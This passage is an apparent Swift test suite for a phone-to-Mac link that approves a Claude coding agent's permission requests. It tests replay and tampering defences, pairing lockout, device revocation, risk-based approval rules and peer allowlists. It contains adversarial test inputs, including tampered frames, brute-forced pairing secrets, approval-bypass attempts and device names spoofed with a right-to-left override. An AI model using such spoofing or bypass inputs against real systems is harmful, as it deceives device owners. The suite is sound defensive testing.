// SPDX-License-Identifier: Apache-2.0

import Network
import XCTest
@testable import PairVoxLink
@testable import PairVoxLinkKit

/// A transport whose sends can be made to fail on demand, as a connection that has died under the app does.
final class FlakySendTransport: LinkTransport, @unchecked Sendable {
    private let inner: LinkTransport
    private let lock = NSLock()
    private var failing = false
    init(_ inner: LinkTransport) { self.inner = inner }
    var peer: String? { inner.peer }
    func failSends() { lock.lock(); failing = true; lock.unlock() }
    func send(_ data: Data) async throws {
        lock.lock(); let fail = failing; lock.unlock()
        if fail { throw LinkError.closed }
        try await inner.send(data)
    }
    func receive() async throws -> Data { try await inner.receive() }
    func close() async { await inner.close() }
}

final class FakeEngine: LinkEngine, @unchecked Sendable {
    private let lock = NSLock()
    private var _calls: [String] = []
    var calls: [String] { lock.lock(); defer { lock.unlock() }; return _calls }
    private func add(_ s: String) { lock.lock(); _calls.append(s); lock.unlock() }
    func submit(_ text: String) async { add("submit:\(text)") }
    func approve(requestID: String, projectID: String?) async { add("approve:\(requestID)" + (projectID.map { "@\($0)" } ?? "")) }
    func deny(requestID: String, projectID: String?) async { add("deny:\(requestID)" + (projectID.map { "@\($0)" } ?? "")) }
    func interrupt() async { add("interrupt") }
    func switchProject(_ projectID: String) async -> Bool { add("switch:\(projectID)"); return true }
}

final class Clock: @unchecked Sendable {
    private let lock = NSLock()
    private var now = Date(timeIntervalSince1970: 1_000_000)
    func get() -> Date { lock.lock(); defer { lock.unlock() }; return now }
    func advance(_ s: TimeInterval) { lock.lock(); now = now.addingTimeInterval(s); lock.unlock() }
}

final class LinkTests: XCTestCase {
    func snapshot(risk: String = "low", voice: Bool = true, id: String = "R1") -> LinkSnapshot {
        LinkSnapshot(phase: "awaitingPermission", project: "app", transcriptTail: [],
                     request: LinkRequest(requestID: id, summary: "Edit a.swift", spokenPrompt: "Claude wants to edit a dot swift. Allow?",
                                          risk: risk, reasons: [], voiceApprovable: voice), queuedRequests: 0)
    }

    func makeHost(accept: Bool = true, clock: Clock = Clock()) async -> (LinkHost, FakeEngine, PairingManager, Clock) {
        let pairing = PairingManager(storeURL: nil)
        let engine = FakeEngine()
        let host = LinkHost(pairing: pairing, engine: engine, clock: { clock.get() })
        await host.setPairingApproval { _ in accept }
        return (host, engine, pairing, clock)
    }

    /// Pairs a phone over a memory transport and returns its credentials.
    func pairPhone(_ host: LinkHost, _ pairing: PairingManager) async throws -> (String, Data) {
        let offer = await pairing.createOffer(now: Clock().get())
        let material = PairingClient.material(fromQR: offer.display)!
        let (a, b) = MemoryTransport.pair()
        Task { await host.serve(b) }
        let creds = try await LinkClient.pair(over: a, material: material, deviceName: "Test iPhone")
        return (creds.deviceID, creds.psk)
    }

    func connect(_ host: LinkHost, _ id: String, _ psk: Data) async throws -> LinkClient {
        let (a, b) = MemoryTransport.pair()
        Task { await host.serve(b) }
        return try await LinkClient.connect(over: a, deviceID: id, psk: psk)
    }

    func nextSnapshot(_ c: LinkClient) async throws -> LinkSnapshot {
        while true { if case .snapshot(let s) = try await c.receive() { return s } }
    }

    // MARK: crypto

    func testFramesRoundTripAndRejectReplayReorderAndTampering() throws {
        let psk = Handshake.randomBytes(32), cn = Handshake.randomBytes(16), hn = Handshake.randomBytes(16)
        var client = FrameCodec(keys: .derive(psk: psk, clientNonce: cn, hostNonce: hn, isHost: false))
        var host = FrameCodec(keys: .derive(psk: psk, clientNonce: cn, hostNonce: hn, isHost: true))
        let f1 = try client.seal(Data("one".utf8)), f2 = try client.seal(Data("two".utf8))
        XCTAssertEqual(try host.open(f1), Data("one".utf8))
        XCTAssertThrowsError(try host.open(f1), "replay") { XCTAssertEqual($0 as? LinkError, .replay) }
        var tampered = f2; tampered[tampered.count - 1] ^= 1
        XCTAssertThrowsError(try host.open(tampered)) { XCTAssertEqual($0 as? LinkError, .authFailed) }
        XCTAssertEqual(try host.open(f2), Data("two".utf8), "a failed frame does not advance the counter")
        XCTAssertThrowsError(try host.open(Data([1, 2, 3])))
        // The host's own frames cannot be fed back to the host (different direction key).
        let back = try host.seal(Data("x".utf8))
        XCTAssertThrowsError(try host.open(back))
    }

    // MARK: pairing

    func testPairingNeedsTheSecretTheOwnersClickAndWorksOnce() async throws {
        let (host, _, pairing, clock) = await makeHost()
        let creds = try await pairPhone(host, pairing)
        XCTAssertEqual(creds.1.count, 32)
        let list = await pairing.pairedDevices()
        XCTAssertEqual(list.map(\.name), ["Test iPhone"])
        // Wrong secret
        let offer = await pairing.createOffer(now: clock.get())
        var wrong = PairingClient.material(fromQR: offer.display)!
        wrong[0] ^= 0x01   // one bit off
        let (a, b) = MemoryTransport.pair(); Task { await host.serve(b) }
        do { _ = try await LinkClient.pair(over: a, material: wrong, deviceName: "x"); XCTFail() } catch {}
        // The right secret still works (one wrong try does not burn the offer), then the offer is spent.
        let (c, d) = MemoryTransport.pair(); Task { await host.serve(d) }
        _ = try await LinkClient.pair(over: c, material: PairingClient.material(fromQR: offer.display)!, deviceName: "Second")
        let (e, f) = MemoryTransport.pair(); Task { await host.serve(f) }
        do { _ = try await LinkClient.pair(over: e, material: PairingClient.material(fromQR: offer.display)!, deviceName: "Third"); XCTFail() } catch {}
    }

    func testDeclinedAndExpiredPairingIssuesNoKey() async throws {
        let (host, _, pairing, clock) = await makeHost(accept: false)
        let offer = await pairing.createOffer(now: clock.get())
        let (a, b) = MemoryTransport.pair(); Task { await host.serve(b) }
        do { _ = try await LinkClient.pair(over: a, material: PairingClient.material(fromQR: offer.display)!, deviceName: "x"); XCTFail() } catch {}
        let none = await pairing.pairedDevices()
        XCTAssertTrue(none.isEmpty)
        let (host2, _, pairing2, clock2) = await makeHost()
        let offer2 = await pairing2.createOffer(now: clock2.get())
        clock2.advance(PairingManager.offerLifetime + 1)
        let (c, d) = MemoryTransport.pair(); Task { await host2.serve(d) }
        do { _ = try await LinkClient.pair(over: c, material: PairingClient.material(fromQR: offer2.display)!, deviceName: "x"); XCTFail() } catch {}
    }

    /// Hardening task 3.1: there is no short code any more. Every offer is a fresh 16-byte secret, so a captured
    /// exchange cannot be searched offline the way a six-digit code could (a million tries, under a second).
    func testEveryOfferIsASixteenByteSecret() async throws {
        let pairing = PairingManager(storeURL: nil)
        var seen = Set<Data>()
        for _ in 0..<20 {
            let offer = await pairing.createOffer()
            let secret = try XCTUnwrap(PairingClient.material(fromQR: offer.display))
            XCTAssertEqual(secret.count, PairingManager.secretLength)
            XCTAssertTrue(seen.insert(secret).inserted, "a new secret each time")
        }
        XCTAssertEqual(PairingManager.secretLength, 16)
    }

    func testTwelveWrongSecretsBurnTheOffer() async throws {
        let pairing = PairingManager(storeURL: nil)
        let offer = await pairing.createOffer(now: Date())
        for _ in 0..<PairingManager.maxTotalFailures {
            let r = PairingClient.request(material: Data("000000-not-it".utf8), deviceName: "x")
            _ = try? await pairing.redeem(r, peer: "p\(Int.random(in: 0...1_000_000))", accept: { _ in true })
        }
        let good = PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "x")
        do { _ = try await pairing.redeem(good, accept: { _ in true }); XCTFail() } catch { XCTAssertEqual(error as? PairingError, .noOffer) }
    }

    // MARK: connection

    func testPairedPhoneConnectsAndUnknownOrRevokedPhonesAreRefused() async throws {
        let (host, _, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)
        await host.publish(snapshot())
        let s = try await nextSnapshot(client)
        XCTAssertEqual(s.request?.requestID, "R1")
        // Wrong key: a plain authentication failure. It must not be one of the refusals, which say something about
        // whether the device is known and are sent only before any key has been tried.
        do { _ = try await connect(host, id, Handshake.randomBytes(32)); XCTFail() } catch {
            XCTAssertEqual(error as? LinkError, .authFailed)
            XCTAssertNotEqual(error as? LinkError, .unknownDevice)
            XCTAssertNotEqual(error as? LinkError, .revoked)
        }
        // Unknown device: the phone is told, so it can stop retrying and ask to be paired again.
        do { _ = try await connect(host, UUID().uuidString, psk); XCTFail() } catch { XCTAssertEqual(error as? LinkError, .unknownDevice) }
        // Revoked
        try await pairing.revoke(id)
        do { _ = try await connect(host, id, psk); XCTFail() } catch { XCTAssertEqual(error as? LinkError, .revoked) }
    }

    func testAPhoneSpeakingAnotherProtocolVersionIsToldSo() async throws {
        let (host, _, pairing, _) = await makeHost()
        let (id, _) = try await pairPhone(host, pairing)
        let (a, b) = MemoryTransport.pair()
        Task { await host.serve(b) }
        try await a.send(try JSONEncoder().encode(Opening.hello(version: Handshake.version + 1, deviceID: id, clientNonce: Handshake.randomBytes(16))))
        let refusal = try JSONDecoder().decode(HandshakeRefusal.self, from: try await a.receive())
        XCTAssertEqual(refusal.refused, .versionMismatch)
    }

    /// Review task 3.5: the session hello must carry a 16-byte nonce, as pairing already required. A wrong length
    /// gets no challenge: the connection ends, as it would for a wrong key.
    func testAHelloWithTheWrongNonceLengthGetsNoChallenge() async throws {
        let (host, _, pairing, _) = await makeHost()
        let (id, _) = try await pairPhone(host, pairing)
        for nonce in [Data(), Handshake.randomBytes(15), Handshake.randomBytes(4096)] {
            let (a, b) = MemoryTransport.pair()
            Task { await host.serve(b) }
            try await a.send(try JSONEncoder().encode(Opening.hello(version: Handshake.version, deviceID: id, clientNonce: nonce)))
            do {
                let reply = try await a.receive()
                XCTAssertNil(try? JSONDecoder().decode(Challenge.self, from: reply), "no challenge for a \(nonce.count)-byte nonce")
            } catch {
                // Closed without a reply: the expected outcome.
            }
        }
    }

    func testRevokedWhileConnectedIsCutOffAtTheNextMessage() async throws {
        let (host, engine, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)
        try await pairing.revoke(id)
        try await client.send(.submit("hello"))
        try await Task.sleep(nanoseconds: 200_000_000)
        XCTAssertTrue(engine.calls.isEmpty)
    }

    // MARK: approvals

    func testApprovalRulesAreEnforcedByTheMac() async throws {
        let (host, engine, pairing, clock) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)

        // Low risk: voice approval is accepted once the request was shown on this phone.
        await host.publish(snapshot())
        _ = try await nextSnapshot(client)
        try await client.send(.approve(requestID: "R1", method: .voice, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1"])

        // A request the Mac does not allow by voice cannot be approved by voice from the phone.
        await host.publish(snapshot(risk: "medium", voice: false, id: "R2"))
        _ = try await nextSnapshot(client)
        try await client.send(.approve(requestID: "R2", method: .voice, auth: .none))
        // An approval for something that is not the waiting request is refused.
        try await client.send(.approve(requestID: "OLD", method: .tap, auth: .passcode))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1"])

        // High risk needs a deliberate tap with the phone's own check (Face ID, Touch ID or the passcode); a spoken yes
        // never counts, and since audit run 7 neither does a tap from a phone with no passcode set.
        await host.publish(snapshot(risk: "high", voice: false, id: "R3"))
        _ = try await nextSnapshot(client)
        try await client.send(.approve(requestID: "R3", method: .voice, auth: .faceID))
        try await client.send(.approve(requestID: "R3", method: .tap, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1"])
        try await client.send(.approve(requestID: "R3", method: .tap, auth: .passcode))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1", "approve:R3"])

        // A stale request cannot be answered by voice, but a tap works.
        await host.publish(snapshot(id: "R4"))
        _ = try await nextSnapshot(client)
        clock.advance(LinkHost.staleAfter + 1)
        try await client.send(.approve(requestID: "R4", method: .voice, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls.last, "approve:R3")
        try await client.send(.approve(requestID: "R4", method: .tap, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls.last, "approve:R4")
    }

    // The phone's "Interrupt Claude" is a command, not a setting: each tap reaches the Mac's engine once.
    func testInterruptFromThePhoneReachesTheEngine() async throws {
        let (host, engine, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)
        await host.publish(snapshot())
        _ = try await nextSnapshot(client)
        try await client.send(.interrupt)
        try await client.send(.interrupt)
        let deadline = Date().addingTimeInterval(2)
        while engine.calls.filter({ $0 == "interrupt" }).count < 2, Date() < deadline { try await Task.sleep(nanoseconds: 20_000_000) }
        XCTAssertEqual(engine.calls.filter { $0 == "interrupt" }.count, 2)
    }

    func testRequestNotShownOnThisConnectionCannotBeApproved() async throws {
        let (host, engine, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        await host.publish(snapshot())   // published before any phone is connected
        let client = try await connect(host, id, psk)
        // Connecting re-presents it, so wait for that, then a fresh connection must also see it before approving.
        _ = try await nextSnapshot(client)
        try await client.send(.approve(requestID: "R1", method: .voice, auth: .none))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1"], "re-presented on connect, so it counts as shown")
    }

    func testOversizedTextIsIgnored() async throws {
        let (host, engine, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)
        try await client.send(.submit(String(repeating: "a", count: 5000)))
        try await client.send(.submit("fix it"))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["submit:fix it"])
    }
}

final class UndeliveredPairingTests: XCTestCase {
    private func harness(approvalDelay: UInt64) async throws -> (PairingManager, TCPListener, Data) {
        let pairing = PairingManager(storeURL: nil)
        let host = LinkHost(pairing: pairing, engine: FakeEngine())
        await host.setPairingApproval { _ in try? await Task.sleep(nanoseconds: approvalDelay); return true }
        let listener = try TCPListener { transport in Task { await host.serve(transport) } }
        try await listener.start()
        let offer = await pairing.createOffer()
        return (pairing, listener, PairingClient.material(fromQR: offer.display)!)
    }

    /// The phone gives up while the owner is still deciding, and the owner clicks Pair afterwards.
    func testAPhoneThatGaveUpBeforeTheClickIsNotLeftPaired() async throws {
        let (pairing, listener, material) = try await harness(approvalDelay: 800_000_000)
        defer { listener.stop() }
        let transport = TCPTransport.connect(host: "127.0.0.1", port: listener.port)
        let attempt = Task { try await LinkClient.pair(over: transport, material: material, deviceName: "Impatient") }
        try await Task.sleep(nanoseconds: 300_000_000)
        await transport.close()
        attempt.cancel()
        try await Task.sleep(nanoseconds: 2_000_000_000)
        let left = await pairing.pairedDevices()
        XCTAssertTrue(left.filter { !$0.revoked }.isEmpty, "a phone that never received its key must not stay paired")
    }

    func testAPhoneThatWaitsAndConfirmsStaysPaired() async throws {
        let (pairing, listener, material) = try await harness(approvalDelay: 600_000_000)
        defer { listener.stop() }
        let creds = try await LinkClient.pair(over: TCPTransport.connect(host: "127.0.0.1", port: listener.port),
                                              material: material, deviceName: "Patient")
        try await Task.sleep(nanoseconds: 500_000_000)
        let active = await pairing.activeDevice(creds.deviceID)
        XCTAssertNotNil(active)
    }
}

final class TCPLoopbackTests: XCTestCase {
    func testPairConnectAndApproveOverRealSockets() async throws {
        let pairing = PairingManager(storeURL: nil)
        let engine = FakeEngine()
        let host = LinkHost(pairing: pairing, engine: engine)
        await host.setPairingApproval { _ in true }
        let listener = try TCPListener { transport in Task { await host.serve(transport) } }
        try await listener.start()
        defer { listener.stop() }
        XCTAssertNotEqual(listener.port, 0)

        let offer = await pairing.createOffer()
        let creds = try await LinkClient.pair(over: TCPTransport.connect(host: "127.0.0.1", port: listener.port),
                                              material: PairingClient.material(fromQR: offer.display)!, deviceName: "Loopback phone")
        let client = try await LinkClient.connect(over: TCPTransport.connect(host: "127.0.0.1", port: listener.port),
                                                  deviceID: creds.deviceID, psk: creds.psk)
        await host.publish(LinkSnapshot(phase: "awaitingPermission", project: "app", transcriptTail: [],
                                        request: LinkRequest(requestID: "R1", summary: "Edit a.swift", spokenPrompt: "Allow?",
                                                             risk: "low", reasons: [], voiceApprovable: true), queuedRequests: 0))
        var got: LinkSnapshot?
        while got == nil { if case .snapshot(let s) = try await client.receive() { got = s } }
        XCTAssertEqual(got?.request?.requestID, "R1")
        try await client.send(.approve(requestID: "R1", method: .voice, auth: .none))
        try await Task.sleep(nanoseconds: 300_000_000)
        XCTAssertEqual(engine.calls, ["approve:R1"])
    }

    /// This Mac's first IPv4 address that is not loopback (a Wi-Fi or Ethernet address), if it has one.
    static func lanAddress() -> String? {
        var list: UnsafeMutablePointer<ifaddrs>?
        guard getifaddrs(&list) == 0, let first = list else { return nil }
        defer { freeifaddrs(list) }
        var node: UnsafeMutablePointer<ifaddrs>? = first
        while let n = node {
            defer { node = n.pointee.ifa_next }
            guard let a = n.pointee.ifa_addr, a.pointee.sa_family == UInt8(AF_INET) else { continue }
            var buf = [CChar](repeating: 0, count: Int(INET_ADDRSTRLEN))
            var addr = a.withMemoryRebound(to: sockaddr_in.self, capacity: 1) { $0.pointee.sin_addr }
            inet_ntop(AF_INET, &addr, &buf, socklen_t(INET_ADDRSTRLEN))
            let text = String(cString: buf)
            if !text.hasPrefix("127.") { return text }
        }
        return nil
    }

    /// Whether a TCP connection to host:port is accepted within two seconds.
    static func accepts(_ host: String, _ port: UInt16) async -> Bool {
        let connection = NWConnection(host: NWEndpoint.Host(host), port: NWEndpoint.Port(rawValue: port)!, using: .tcp)
        let result = await withCheckedContinuation { (cont: CheckedContinuation<Bool, Never>) in
            let once = OneShot()
            connection.stateUpdateHandler = { state in
                switch state {
                case .ready: if once.take() { cont.resume(returning: true) }
                case .failed, .waiting, .cancelled: if once.take() { cont.resume(returning: false) }
                default: break
                }
            }
            connection.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 2) { if once.take() { cont.resume(returning: false) } }
        }
        connection.cancel()
        return result
    }

    /// Review task 3.2: a listener bound to one address is not open on the others. Before, it listened on every
    /// interface and the peer address check was the only gate; a carrier NAT or a forward could get past that.
    func testABoundListenerIsClosedOnOtherInterfaces() async throws {
        guard let lan = Self.lanAddress() else { throw XCTSkip("no non-loopback IPv4 address on this machine") }
        let bound = try TCPListener(port: 0, bindTo: "127.0.0.1", onConnection: { _ in })
        try await bound.start()
        defer { bound.stop() }
        let reachedLoopback = await Self.accepts("127.0.0.1", bound.port)
        let reachedLAN = await Self.accepts(lan, bound.port)
        XCTAssertTrue(reachedLoopback, "open on the address it is bound to")
        XCTAssertFalse(reachedLAN, "closed on \(lan)")

        // Control: an unbound listener is open on the LAN address, so the check above means something here.
        let open = try TCPListener(port: 0, onConnection: { _ in })
        try await open.start()
        defer { open.stop() }
        let reachedOpenLAN = await Self.accepts(lan, open.port)
        XCTAssertTrue(reachedOpenLAN, "an unbound listener is reachable on \(lan)")
    }

    /// Only a Tailscale tunnel interface counts as the tailnet: the same 100.64/10 range on Wi-Fi is a carrier NAT.
    func testOnlyATunnelInterfaceCarriesTheTailnetAddress() {
        XCTAssertTrue(TailnetAddress.isTunnelInterface("utun4"))
        XCTAssertFalse(TailnetAddress.isTunnelInterface("en0"))
        XCTAssertFalse(TailnetAddress.isTunnelInterface("bridge100"))
    }
}

import PairVoxCore

final class EngineLinkTests: XCTestCase {
    func testSnapshotCarriesTheMacsOwnAssessment() {
        var s = EngineSnapshot()
        s.phase = .awaitingPermission
        let req = PermissionRequest(requestID: "R9", toolName: "Bash", input: ["command": .string("git push origin main")])
        let assessment = PermissionPolicy(projectRoot: "/p").assess(req)
        s.pendingPermission = PendingPermission(request: req, assessment: assessment)
        let link = EngineLink.snapshot(from: s, project: "p")
        XCTAssertEqual(link.request?.requestID, "R9")
        XCTAssertEqual(link.request?.risk, "high")
        XCTAssertEqual(link.request?.voiceApprovable, false)
    }
}

import Network

final class CompanionTests: XCTestCase {
    func testOnlyTailnetAndLoopbackPeersMayStartAHandshake() {
        func v4(_ s: String) -> NWEndpoint.Host { .ipv4(IPv4Address(s)!) }
        XCTAssertTrue(TailnetAddress.isAllowedPeer(v4("100.101.102.103")))
        XCTAssertTrue(TailnetAddress.isAllowedPeer(v4("100.64.0.1")))
        XCTAssertTrue(TailnetAddress.isAllowedPeer(v4("100.127.255.254")))
        XCTAssertTrue(TailnetAddress.isAllowedPeer(v4("127.0.0.1")))
        for outside in ["100.63.255.255", "100.128.0.1", "192.168.1.20", "10.0.0.5", "8.8.8.8"] {
            XCTAssertFalse(TailnetAddress.isAllowedPeer(v4(outside)), outside)
        }
        XCTAssertTrue(TailnetAddress.isAllowedPeer(.ipv6(IPv6Address("fd7a:115c:a1e0::1234")!)))
        XCTAssertFalse(TailnetAddress.isAllowedPeer(.ipv6(IPv6Address("fe80::1")!)))
        XCTAssertFalse(TailnetAddress.isAllowedPeer(.name("example.com", nil)))
    }

    func testPairedPhonesSurviveARestartAndTheFileIsPrivate() async throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("pv-link-\(UUID().uuidString)/paired.json")
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let first = PairingManager(storeURL: url)
        let offer = await first.createOffer()
        let request = PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "Phone A")
        _ = try await first.redeem(request, accept: { _ in true })
        let mode = (try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(mode, 0o600)
        let second = PairingManager(storeURL: url)
        let names = await second.pairedDevices().map(\.name)
        XCTAssertEqual(names, ["Phone A"])
        let id = await second.pairedDevices()[0].id
        try await second.revoke(id)
        let third = PairingManager(storeURL: url)
        let revoked = await third.pairedDevices().first?.revoked
        XCTAssertEqual(revoked, true, "revocation is stored")
    }

    func testQRPayloadNamesTheMacAndCarriesTheSecret() async {
        let m = PairingManager(storeURL: nil)
        let offer = await m.createOffer()
        let payload = offer.qrPayload(host: "100.100.1.2", port: 47821)
        XCTAssertTrue(payload.hasPrefix("pairvox://pair?h=100.100.1.2&p=47821&s="))
        XCTAssertFalse(payload.contains("+") || payload.contains("/") && payload.dropFirst(12).contains("/") )
    }
}

/// An engine with no project behind it: it has nothing to send text to and says so.
final class NoProjectEngine: LinkEngine, @unchecked Sendable {
    func submit(_ text: String) async { XCTFail("nothing may be submitted when there is no project") }
    func approve(requestID: String, projectID: String?) async {}
    func deny(requestID: String, projectID: String?) async {}
    func interrupt() async {}
    func canSubmit() async -> Bool { false }
}

extension LinkTests {
    func testTextTypedOnAPhoneWhenTheMacHasNoProjectOpenIsAnsweredNotSwallowed() async throws {
        let pairing = PairingManager(storeURL: nil)
        let clock = Clock()      // the pairing helper issues its offer at this fixed time, so the host must use it too
        let host = LinkHost(pairing: pairing, engine: NoProjectEngine(), clock: { clock.get() })
        await host.setPairingApproval { _ in true }
        let (id, psk) = try await pairPhone(host, pairing)
        let client = try await connect(host, id, psk)
        try await client.send(.submit("hello from the phone"))
        // The reply is a notice that says why. If it never comes, closing the client ends the read after 3 s.
        let guardTask = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); await client.close() }
        defer { guardTask.cancel() }
        var told: String?
        while told == nil, let message = try? await client.receive() {
            if case .notice(let text) = message { told = text }
        }
        XCTAssertTrue(told?.contains("no project open") == true, "the phone is told the text went nowhere: \(String(describing: told))")
    }

    func testAKeepAlivePingThatCannotBeSentClosesTheLinkAtOnce() async throws {
        let (host, _, pairing, _) = await makeHost()
        let (id, psk) = try await pairPhone(host, pairing)
        let (a, b) = MemoryTransport.pair()
        Task { await host.serve(b) }
        let flaky = FlakySendTransport(a)
        let client = try await LinkClient.connect(over: flaky, deviceID: id, psk: psk)
        // The silence limit is far away, so only the failed ping can end this link.
        await client.startKeepAlive(every: 0.05, idleAfter: 100)
        flaky.failSends()
        let began = Date()
        do { while true { _ = try await client.receive() } }
        catch { XCTAssertLessThan(Date().timeIntervalSince(began), 2, "the link ended because the ping could not be sent") }
    }

    func testAConnectionToAClosedPortFailsAtOnceWithTheRealError() async throws {
        // Find a port with nothing on it: listen on any port, note it, stop.
        let listener = try TCPListener(port: 0, onConnection: { _ in })
        try await listener.start()
        let port = listener.port
        listener.stop()
        try await Task.sleep(nanoseconds: 200_000_000)
        let transport = TCPTransport.connect(host: "127.0.0.1", port: port)
        let began = Date()
        do { _ = try await transport.receive(); XCTFail("nothing is listening on \(port)") }
        catch {
            XCTAssertLessThan(Date().timeIntervalSince(began), 3, "refused at once, not after a retry wait")
            guard case .posix(let code)? = error as? NWError else { return XCTFail("the network's own error is expected, got \(error)") }
            // Refused, or EADDRINUSE when the kernel reuses the port the listener just freed as the connecting
            // socket's own port (a self-connect, seen about 1 run in 20): either is the real error, at once.
            XCTAssertTrue([.ECONNREFUSED, .EADDRINUSE].contains(code), "got \(code)")
        }
    }

    func testAConnectionStampsWhenThePhoneWasLastSeenAndTheStampIsStored() async throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("pv-link-\(UUID().uuidString)/paired.json")
        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
        let clock = Clock()
        let pairing = PairingManager(storeURL: url)
        let host = LinkHost(pairing: pairing, engine: FakeEngine(), clock: { clock.get() })
        await host.setPairingApproval { _ in true }
        let (id, psk) = try await pairPhone(host, pairing)
        let never = await pairing.pairedDevices()[0].lastSeenAt
        XCTAssertNil(never, "a phone that paired but never connected has no stamp")
        _ = try await connect(host, id, psk)
        // The host stamps after it has verified the phone's proof, which can be just after `connect` returns.
        var seen: Date?
        for _ in 0..<100 where seen == nil {
            seen = await pairing.pairedDevices()[0].lastSeenAt
            if seen == nil { try await Task.sleep(nanoseconds: 20_000_000) }
        }
        XCTAssertEqual(seen, clock.get(), "the stamp is the host's clock at the handshake")
        let reloaded = await PairingManager(storeURL: url).pairedDevices()[0].lastSeenAt
        XCTAssertEqual(reloaded, seen, "the stamp survives a restart")
        // Within a minute nothing is rewritten; after a minute the stamp moves.
        clock.advance(30); await pairing.markSeen(id, now: clock.get())
        let unchanged = await pairing.pairedDevices()[0].lastSeenAt
        XCTAssertEqual(unchanged, seen)
        clock.advance(31); await pairing.markSeen(id, now: clock.get())
        let moved = await pairing.pairedDevices()[0].lastSeenAt
        XCTAssertEqual(moved, clock.get())
    }
}

final class AuditRun3PairingTests: XCTestCase {
    func testRevokedPhoneIsDisconnectedAndReceivesNothingMore() async throws {
        let h = LinkTests()
        let (host, _, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        await host.publish(h.snapshot(id: "BEFORE"))
        _ = try await h.nextSnapshot(client)
        try await pairing.revoke(id)
        await host.publish(h.snapshot(id: "SECRET1"))
        let connected = await host.connectedCount()
        XCTAssertEqual(connected, 0, "a removed phone's connection is closed on the next push")
        do {
            while true { if case .snapshot(let s) = try await client.receive() { XCTAssertNotEqual(s.request?.requestID, "SECRET1") } }
        } catch {}
    }

    func testDropDeviceClosesItsConnectionsImmediately() async throws {
        let h = LinkTests()
        let (host, _, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        _ = try await h.connect(host, id, psk)
        try await Task.sleep(nanoseconds: 100_000_000)
        let before = await host.connectedCount()
        XCTAssertEqual(before, 1)
        await host.dropDevice(id)
        let after = await host.connectedCount()
        XCTAssertEqual(after, 0)
    }

    func testFailedSaveStillBlocksThePhoneAndReportsTheError() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-rv-\(UUID().uuidString)")
        let url = dir.appendingPathComponent("paired.json")
        let m = PairingManager(storeURL: url)
        let offer = await m.createOffer()
        _ = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "A"), accept: { _ in true })
        let id = await m.pairedDevices()[0].id
        try FileManager.default.setAttributes([.posixPermissions: 0o500], ofItemAtPath: dir.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: dir.path); try? FileManager.default.removeItem(at: dir) }
        do { try await m.revoke(id) } catch { /* the error is reported to the caller */ }
        let active = await m.activeDevice(id)
        XCTAssertNil(active, "blocked in memory even though the save failed")
    }

    func testDeviceNamesAreCleanedBeforeTheAcceptDialog() async throws {
        XCTAssertEqual(sanitizedDeviceName("iPhone” is Anthony’s\n\u{202E}evil"), "iPhone” is Anthony’sevil")
        XCTAssertEqual(sanitizedDeviceName("\u{202E}\n"), "Unnamed phone")
        XCTAssertLessThanOrEqual(sanitizedDeviceName(String(repeating: "👨‍👩‍👧‍👦", count: 64)).utf8.count, 128)
        let m = PairingManager(storeURL: nil)
        let offer = await m.createOffer()
        let seen = NameBox()
        _ = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "Ann\u{202E}\nOK"),
                               accept: { n in await seen.set(n); return true })
        let shown = await seen.value
        XCTAssertEqual(shown, "AnnOK")
    }

    func testUnreadableStoreIsKeptAsideNotOverwritten() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-bad-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        try Data("garbage".utf8).write(to: url)
        _ = PairingManager(storeURL: url)
        let kept = try FileManager.default.contentsOfDirectory(atPath: dir.path).filter { $0.contains("unreadable") }
        XCTAssertEqual(kept.count, 1)
    }

    func testStoreFileAndFolderArePrivate() async throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-perm-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o755])
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let m = PairingManager(storeURL: url)
        let offer = await m.createOffer()
        _ = try await m.redeem(PairingClient.request(material: PairingClient.material(fromQR: offer.display)!, deviceName: "A"), accept: { _ in true })
